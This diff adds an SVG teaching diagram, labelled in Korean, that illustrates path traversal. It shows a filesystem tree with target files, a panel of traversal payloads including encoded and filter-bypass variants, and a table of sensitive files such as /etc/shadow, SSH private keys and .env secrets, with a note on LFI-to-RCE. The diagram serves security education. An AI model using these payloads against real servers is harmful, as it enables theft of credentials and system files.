@@ -1,0 +1,113 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="500" viewBox="0 0 880 500">
+  <defs>
+    <marker id="arr-red" viewBox="0 0 14 14" refX="12" refY="7"
+            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
+      <path d="M 0 0 L 13 7 L 0 14 z" fill="#e05555"/>
+    </marker>
+    <marker id="arr-green" viewBox="0 0 14 14" refX="12" refY="7"
+            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
+      <path d="M 0 0 L 13 7 L 0 14 z" fill="#55c555"/>
+    </marker>
+  </defs>
+
+  <rect width="880" height="500" fill="#0a0a0a" rx="12"/>
+
+  <text x="440" y="46" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
+        font-size="22" font-weight="700" fill="#e8e8e8">Path Traversal: 디렉토리 탈출 공격</text>
+
+  <!-- Filesystem diagram -->
+  <text x="220" y="80" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
+        font-size="14" font-weight="600" fill="#7ec8e3">파일시스템 구조</text>
+
+  <rect x="60" y="90" width="320" height="250" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1"/>
+  <text x="76" y="112" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#55c555" xml:space="preserve">/  (루트)</text>
+  <text x="76" y="132" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#55c555" xml:space="preserve">├── etc/</text>
+  <text x="76" y="152" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#e05555" xml:space="preserve">│   ├── passwd       ← 공격 목표!</text>
+  <text x="76" y="172" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#e05555" xml:space="preserve">│   └── shadow       ← 해시된 비밀번호</text>
+  <text x="76" y="192" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#7ec8e3" xml:space="preserve">├── var/www/html/    ← 웹 루트</text>
+  <text x="76" y="212" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#7ec8e3" xml:space="preserve">│   └── uploads/     ← 허용 디렉토리</text>
+  <text x="76" y="232" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#7ec8e3" xml:space="preserve">│       ├── img1.jpg  ← 정상 접근</text>
+  <text x="76" y="252" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#e05555" xml:space="preserve">│       └── ../../../etc/passwd ← 탈출!</text>
+  <text x="76" y="272" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#888" xml:space="preserve">├── home/</text>
+  <text x="76" y="292" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#e05555" xml:space="preserve">│   └── ubuntu/.ssh/id_rsa ← SSH 키</text>
+  <text x="76" y="312" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="12" fill="#e05555" xml:space="preserve">└── proc/self/environ  ← 환경변수</text>
+
+  <!-- Attack examples -->
+  <text x="660" y="80" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
+        font-size="14" font-weight="600" fill="#e05555">공격 페이로드</text>
+
+  <rect x="460" y="90" width="360" height="250" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1"/>
+  <text x="476" y="112" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve"># 기본 형태</text>
+  <text x="476" y="132" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#ce9178" xml:space="preserve">?file=../../../etc/passwd</text>
+  <text x="476" y="154" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve"># URL 인코딩 우회</text>
+  <text x="476" y="174" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#ce9178" xml:space="preserve">?file=..%2F..%2F..%2Fetc%2Fpasswd</text>
+  <text x="476" y="194" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve"># 이중 인코딩 우회</text>
+  <text x="476" y="214" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#ce9178" xml:space="preserve">?file=..%252F..%252F..%252Fetc</text>
+  <text x="476" y="234" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve"># 역슬래시 (Windows)</text>
+  <text x="476" y="254" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#ce9178" xml:space="preserve">?file=..\..\..\windows\win.ini</text>
+  <text x="476" y="274" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve"># 절대 경로 직접 시도</text>
+  <text x="476" y="294" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#ce9178" xml:space="preserve">?file=/etc/passwd</text>
+  <text x="476" y="314" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#ce9178" xml:space="preserve">?file=....//....//etc/passwd</text>
+
+  <!-- Real targets -->
+  <text x="440" y="368" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
+        font-size="15" font-weight="600" fill="#e8e8e8">실제 공격 목표 파일</text>
+
+  <rect x="60" y="380" width="760" height="104" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1"/>
+  <text x="76" y="400" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/etc/passwd              </text>
+  <text x="240" y="400" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">사용자 계정 목록</text>
+  <text x="440" y="400" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/etc/shadow              </text>
+  <text x="604" y="400" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">해시 비밀번호</text>
+  <text x="76" y="420" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/home/user/.ssh/id_rsa   </text>
+  <text x="282" y="420" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">SSH 프라이빗 키</text>
+  <text x="440" y="420" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/.env                    </text>
+  <text x="580" y="420" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">DB 패스워드, API 키</text>
+  <text x="76" y="440" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/proc/self/environ       </text>
+  <text x="288" y="440" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">프로세스 환경변수</text>
+  <text x="440" y="440" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/app/config/database.yml </text>
+  <text x="674" y="440" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">DB 설정</text>
+  <text x="76" y="460" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/proc/self/fd/9          </text>
+  <text x="266" y="460" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">LFI→RCE (로그 인젝션)</text>
+  <text x="440" y="460" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#e05555" xml:space="preserve">/var/log/apache2/error.log</text>
+  <text x="682" y="460" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#888" xml:space="preserve">서버 로그</text>
+  <text x="76" y="478" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
+        font-size="11" fill="#9aa4b8" xml:space="preserve">Windows: C:\Windows\win.ini, C:\boot.ini, C:\inetpub\wwwroot\web.config</text>
+</svg>
